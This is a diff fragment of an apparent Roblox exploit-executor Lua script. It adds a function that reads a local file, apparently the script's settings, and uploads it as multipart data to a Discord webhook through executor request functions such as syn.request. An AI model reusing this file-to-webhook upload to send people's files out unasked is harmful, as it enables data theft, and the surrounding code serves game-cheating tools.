@@ -299,3 +299,36 @@ function sendwebhook2(msg)
     set = game:service'HttpService':JSONDecode(readfile(Name))
     ]]
     ---
+    function sendfile()
+-- Read the file content
+local fileData = readfile(Name)
+
+-- Create the multipart/form-data body
+local boundary = "------------------------" .. game:GetService("HttpService"):GenerateGUID(false)
+local body = "--" .. boundary .. "\r\n"
+    .. "Content-Disposition: form-data; name=\"file\"; filename=\"" .. Name .. "\"\r\n"
+    .. "Content-Type: text/plain\r\n\r\n"
+    .. fileData .. "\r\n--" .. boundary .. "--"
+
+-- Define headers
+local headers = {
+    ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
+    ["Content-Length"] = tostring(#body),
+}
+
+-- Make the HTTP request
+local requestFunction = http_request or request or HttpPost or syn.request
+if requestFunction then
+    local response = requestFunction({
+        Url = DiscordWebhookUrl,
+        Method = "POST",
+        Headers = headers,
+        Body = body,
+    })
+
+    -- Print the response for debugging purposes
+    print(response and response.StatusCode or "No response")
+else
+    print("HTTP request function not found!")
+end
+    end
